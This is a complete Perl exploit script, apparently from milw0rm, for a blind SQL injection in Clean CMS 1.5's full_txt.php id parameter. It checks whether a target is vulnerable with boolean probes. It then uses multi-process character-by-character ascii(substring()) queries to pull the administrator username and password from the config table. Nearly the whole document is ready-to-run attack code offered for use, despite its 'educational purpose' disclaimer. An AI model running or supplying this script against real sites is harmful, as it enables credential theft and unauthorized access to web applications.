<html><head><title>Clean CMS 1.5 (full_txt.php id) Blind SQL Injection Exploit</title></head><pre># Clean CMS 1.5 (full_txt.php id) Blind SQL Injection Exploit
# url: http://www.4yoursite.nl/script_clean_cms.php
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://hack0wn.com &amp;&amp; spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Hack0wn :D

my $MAX_FIELD_LENGTH = 200 ;
my $EXIT_IF_NO_CHAR = 1 ;
my $DEFAULT_THREADS = 15 ;
my $DEFAULT_THREADS_TIMEOUT = 30 ;
my @ascii = ( 32 .. 123 ) ;
my $DEFAULT_THREADS_TIME = 1 ;

 
use LWP::UserAgent ;
 
sub _HELP_AND_EXIT
{
    die &quot;
 
  ./$0 -u &lt;url&gt; -p &lt;pattern&gt;
 
 Options:
  -u    &lt;url&gt;               Ex: http://localhost/full_txt.php?id=19
  -p    &lt;pattern&gt;           HTML pattern.
 
 Other:
  -t    &lt;#&gt;                 Threads, default '$DEFAULT_THREADS'.
  -l    &lt;#&gt;                 Maximum table name length '$MAX_FIELD_LENGTH'.
  -T    &lt;#&gt;                 Timeout.
  -h                        Help (also with --help).
 
  Example:
 
  ./$0 -u \&quot;http://localhost/full_txt.php?id=19\&quot; -p Concurso
 
&quot; ;
}
 
 
    my ($p, $w) = ({ @ARGV }, { }) ;
 
    map {
        &amp;_HELP_AND_EXIT if $_ eq '--help' or $_ eq '-h' ;
    } keys %$p ;
 
    map {
        die &quot;[!] Require: $_\n[!] Help: ./$0 --help\n&quot; unless $p-&gt;{ $_ } ;
    } qw/-u -p/ ;
 
    $p-&gt;{'-t'} = ( $p-&gt;{'-t'} and $p-&gt;{'-t'} =~ /^\d+$/ ) ? $p-&gt;{'-t'} : ( $w-&gt;{'-t'} = $DEFAULT_THREADS ) ;
    $p-&gt;{'-l'} = ( $p-&gt;{'-l'} and $p-&gt;{'-l'} =~ /^\d+$/ ) ? $p-&gt;{'-l'} : ( $w-&gt;{'-l'} = $MAX_FIELD_LENGTH ) ;
    $p-&gt;{'-T'} = ( $p-&gt;{'-T'} and $p-&gt;{'-T'} =~ /^\d+$/ ) ? $p-&gt;{'-T'} : ( $w-&gt;{'-T'} = $DEFAULT_THREADS_TIMEOUT ) ;
 
    map {
        warn &quot;[i] Getting default: $_ $w-&gt;{ $_ }\n&quot; ;
    } sort keys %$w ;
 
    ( &amp;_IS_VULN( $p ) ) ? &amp;_START_WORK( $p ) : die &quot;[i] Bad pattern ? Isn't vulnerable ?\n&quot; ;
 
 
 
 
sub _START_WORK
{
    my $p = shift ;
 
    my $position = 1 ;
 
    pipe(R, W) ;
    pipe(Rs, Ws) ;
    autoflush STDOUT 1 ;
 
    my $sql_message = '' ;
    my $msg = '' ;
    my @pid ;
 
    while( $position &lt;= $p-&gt;{'-l'} )
    {
        my $cf ;
        unless( $cf = fork ){ &amp;_CHECKING( $p, $position ) ; exit(0) ; }
        push(@pid, $cf) ;
 
        my $count = 0 ;
        my $can_exit ;
        my $char_printed ;
 
        while(&lt;R&gt;)
        {
            chomp ;
            push(@pid, (split(/:/))[1] ) if /^pid/ ;
 
            my ($res, $pos, $ascii) = ( split(/ /, $_) ) ;
            $count++ if $pos == $position ;
 
            print &quot;\b&quot; x length($msg), ($msg = &quot;$position $ascii &quot; . chr($ascii) ) ;
 
            if( $res eq 'yes' and $pos == $position ){
                    $char_printed = $can_exit = 1 ;
                    print Ws &quot;STOP $position\n&quot; ;
                    $sql_message .= chr( $ascii ) ;
            }
 
            last if ( $can_exit or $count == @ascii );
        }
 
        map { waitpid($_, 0) } @pid ;
 
        unless( $char_printed )
        {
            if( $EXIT_IF_NO_CHAR )
            {
                warn &quot;\n[!] \$EXIT_IF_NO_CHAR : I can't find a valid character, position $position.\n&quot;  ;
                last ;
            }
        }
 
        $position++ ;
    }
 
    print &quot;[i] USER / PASSWORD:\n$sql_message\n&quot; ;
 
}
 
sub _CHECKING
{
    my ($p, $position) = @_ ;
    my $counter = 0 ;
    my $stop_position ;
 
    foreach my $ascii ( @ascii )
    {
        $counter++ ;
 
        if( $counter % $p-&gt;{'-t'} == 0 )
        {
            my $stop_position ;
            eval
            {
                $SIG{'ALRM'} = sub { die &quot;non_stop\n&quot; } ;
                alarm $DEFAULT_THREADS_TIME ;
                my $line = &lt;Rs&gt; ;
                $stop_position = (split( / /, $line))[1] ;
                alarm 0 ;
            } ;
 
            if( ($stop_position) and $stop_position == $position ){ print &quot;\nnext position\n&quot; ; exit(0) ; }
        }
 
        unless(my $pid = fork )
        {
            print Ws &quot;pid:$pid\n&quot; or die ;
 
 
            my $url = $p-&gt;{'-u'} .
                ' AND ascii(substring((SELECT CONCAT(admin_name,0x202f20,admin_pass) FROM config LIMIT 0,1),' . $position . ',1))='. $ascii ;
 
            my $ua = LWP::UserAgent-&gt;new ;
            $ua-&gt;timeout( $p-&gt;{'-T'} ) ;
 
            my $content ;
            while( 1 )
            {
                last if $content = $ua-&gt;get( $url )-&gt;content ;
            }
 
            ( $content =~ /$p-&gt;{'-p'}/ ) ? print W &quot;yes $position $ascii\n&quot; : print W &quot;no $position $ascii\n&quot; ;
 
            exit( 0 ) ;
        }
 
    }
}
 
 
 
sub _IS_VULN
{
    my $p = shift ;
 
    my $ua = LWP::UserAgent-&gt;new ;
    $ua-&gt;timeout( $p-&gt;{'-T'} ) ;
 
    my ( $one, $two ) = (
        $ua-&gt;get( $p-&gt;{'-u'}.&quot; AND 1=1&quot;)-&gt;content ,
        $ua-&gt;get( $p-&gt;{'-u'}.&quot; AND 1=2&quot;)-&gt;content ,
    ) ;
 
    return ($one =~ /$p-&gt;{'-p'}/ and $two !~ /$p-&gt;{'-p'}/) ? 1 : undef ;
}

# milw0rm.com [2008-11-25]</pre></html>